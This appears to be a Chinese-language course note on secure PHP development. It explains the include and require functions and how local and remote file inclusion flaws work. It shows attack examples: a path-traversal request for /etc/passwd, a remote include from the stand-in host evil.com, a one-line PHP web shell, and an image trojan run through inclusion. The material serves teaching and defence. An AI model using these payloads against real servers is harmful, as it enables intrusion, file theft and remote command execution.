Day25安全开发-PHP应用&文件管理&包含&写入&删除&下载&遍历&安全
OSS对象存储
安全问题：AccessKey泄露
原理：
1.	上传到服务器本身的硬盘
2.	借助云产品OSS对象存储去存放文件

安全 问题：文件包含
Include()在错误发生后脚本继续执行
Require()在错误发生后脚本停止运行
Include_once()如果已经包含，则不再执行
Require_once()如果已经包含，则不再执行

文件包含:
可以是带有php代码的文件当作php文件解析。
 
如图，upload.php包含了include($_GET['page']);参数
漏洞原理
1.	动态文件包含机制
PHP 的 include、require 等函数支持动态加载文件路径。如果路径由用户输入直接控制（如 $_GET['page']），攻击者可以篡改参数值，使程序加载非预期的文件。
2.	路径遍历攻击
攻击者可能通过输入类似 ../../etc/passwd 的路径，读取服务器上的敏感文件（如配置文件、日志文件等）。
3.	远程文件包含（RFI）
如果服务器配置中 allow_url_include 选项开启（默认关闭），攻击者可通过 http://evil.com/shell.txt 这样的 URL 加载远程恶意代码，直接执行任意 PHP 代码。
________________________________________
攻击示例
1.	本地文件包含（LFI）
请求：
http://example.com/?page=../../../../etc/passwd
服务器可能返回 Linux 系统的用户账户信息。
2.	远程文件包含（RFI）
请求：
http://example.com/?page=http://evil.com/shell.php
如果允许远程包含，攻击者可在 shell.php 中写入 <?php system($_GET['cmd']); ?>，进而执行系统命令。
3.	结合文件上传漏洞
攻击者上传一个图片马（如 evil.jpg 包含 PHP 代码），然后通过包含此文件执行代码：
http://example.com/?page=./uploads/evil.jpg
 
在地址栏加入非预期加载的内容
